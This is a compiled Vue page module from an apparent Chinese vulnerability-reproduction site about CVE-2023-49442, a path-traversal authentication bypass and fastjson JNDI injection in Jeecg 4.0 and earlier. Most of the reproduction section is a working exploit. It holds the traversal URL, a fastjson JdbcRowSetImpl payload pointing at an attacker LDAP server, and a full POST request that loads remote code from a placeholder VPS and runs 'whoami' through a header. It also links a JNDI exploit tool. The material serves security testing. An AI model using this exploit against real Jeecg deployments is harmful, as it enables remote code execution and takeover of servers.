import{_ as o}from"./plugin-vue_export-helper-c27b6911.js";import{r as l,o as d,c as s,a as e,b as t,d as a,e as i}from"./app-58e4a7d6.js";const r={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),t(" 漏洞描述")],-1),u=e("p",null,[t("Jeecg 4.0及之前版本中，由于 /api 接口鉴权时未过滤路径遍历，攻击者可构造包含 "),e("code",null,"../"),t(" 的url绕过鉴权。攻击者可构造恶意请求利用 "),e("code",null,"jeecgFormDemoController.do?interfaceTest"),t(" 接口进行 jndi 注入攻击，实现远程代码执行。")],-1),m=e("p",null,"Jeecg（J2EE Code Generation）是开源的代码生成平台，目前官方已停止维护。注：Jeecg 与 Jeecg-boot 非相同应用。",-1),v=e("p",null,"参考链接：",-1),p={href:"https://xz.aliyun.com/t/13283",target:"_blank",rel:"noopener noreferrer"},h=i(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Jeecg &lt;= 4.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>测试环境 fastjson 版本<code>1.2.31</code>，漏洞位置 <code>src/main/java/com/jeecg/demo/controller/JeecgFormDemoController.java</code>。</p><p>直接发包访问接口会 302 跳转，需要构造包含 <code>../</code> 的 url 绕过鉴权。<code>api</code> 接口不做限制，因此构造漏洞地址如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/api/../jeecgFormDemoController.do?interfaceTest=
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,6),g={href:"https://github.com/WhiteHSBG/JNDIExploit",target:"_blank",rel:"noopener noreferrer"},b=i(`<p>创建远程文件 poc.txt，其内容为 fastjson 代码执行的 payload：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>{
	&quot;a&quot;: {
		&quot;@type&quot;: &quot;java.lang.Class&quot;,
		&quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;	
	},
	&quot;b&quot;: {
		&quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,
		&quot;dataSourceName&quot;: &quot;ldap://&lt;your-vps-ip&gt;:1389/Basic/TomcatEcho&quot;,
		&quot;autoCommit&quot;: true
	}
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>发送如下请求包：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /jeecg/api/../jeecgFormDemoController.do?interfaceTest= HTTP/1.1
Host: 127.0.0.1:8081
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
cmd: whoami

serverUrl=http://&lt;your-vps-ip&gt;:8081/poc.txt&amp;requestBody=123&amp;requestMethod=GET
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240417144824154.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,5);function _(x,f){const n=l("ExternalLinkIcon");return d(),s("div",null,[c,u,m,v,e("ul",null,[e("li",null,[e("a",p,[t("https://xz.aliyun.com/t/13283"),a(n)])])]),h,e("p",null,[t("JNDI 注入工具： "),e("a",g,[t("https://github.com/WhiteHSBG/JNDIExploit"),a(n)])]),b])}const J=o(r,[["render",_],["__file","Jeecg jeecgFormDemoController JNDI 代码执行漏洞 CVE-2023-49442.html.vue"]]);export{J as default};
